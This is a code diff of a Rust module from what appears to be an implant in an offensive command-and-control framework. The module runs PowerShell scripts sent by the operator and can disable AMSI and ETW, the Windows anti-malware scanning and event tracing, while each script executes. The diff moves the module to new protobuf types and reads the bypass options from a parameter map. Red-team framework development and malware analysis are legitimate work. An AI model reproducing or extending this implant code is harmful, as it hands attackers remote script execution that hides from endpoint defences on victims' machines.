@@ -1,14 +1,11 @@
-use std::ffi::CString;
-
-use crate::{check_field_optional, check_request, to_error, Module, Result, TaskResult};
-use malefic_helper::protobuf::implantpb::spite::Body;
-use malefic_helper::protobuf::implantpb::AssemblyResponse;
+use crate::{ check_request, Module, Result, TaskResult};
+use malefic_proto::proto::implantpb::spite::Body;
+use malefic_proto::proto::modulepb::BinaryResponse;
 
 use async_trait::async_trait;
 use malefic_helper::win::kit::bypass::{bypass_amsi, bypass_etw, enable_amsi, enable_etw};
 use malefic_helper::win::kit::pwsh::pwsh_exec_command;
 use malefic_trait::module_impl;
-use prost::Message;
 
 pub struct ExecutePowershell {}
 
@@ -22,10 +19,9 @@ impl Module for ExecutePowershell {
         receiver: &mut crate::Input,
         sender: &mut crate::Output,
     ) -> Result {
-        let clr_request = check_request!(receiver, Body::ExecuteClr)?;
-        let request = check_field_optional!(clr_request.execute_binary)?;
-        let amsi_bypass = clr_request.amsi_bypass;
-        let etw_bypass = clr_request.etw_bypass;
+        let request = check_request!(receiver, Body::ExecuteBinary)?;
+        let amsi_bypass = request.param.contains_key("bypass_amsi");
+        let etw_bypass = request.param.contains_key("bypass_etw");
 
         let script = String::from_utf8(request.bin).expect("Invalid UTF-8 sequence");
         let result: Vec<u8>;
@@ -37,7 +33,7 @@ impl Module for ExecutePowershell {
                 bypass_etw();
             }
             let ret = pwsh_exec_command(&script);
-            result = ret.encode_to_vec();
+            result = ret.as_bytes().to_vec();
             if amsi_bypass {
                 enable_amsi();
             }
@@ -45,8 +41,9 @@ impl Module for ExecutePowershell {
                 enable_etw();
             }
         }
-        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(AssemblyResponse{
+        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
             status: 0,
+            message: Vec::new(),
             data: result,
             err: "".to_string(),
         })))
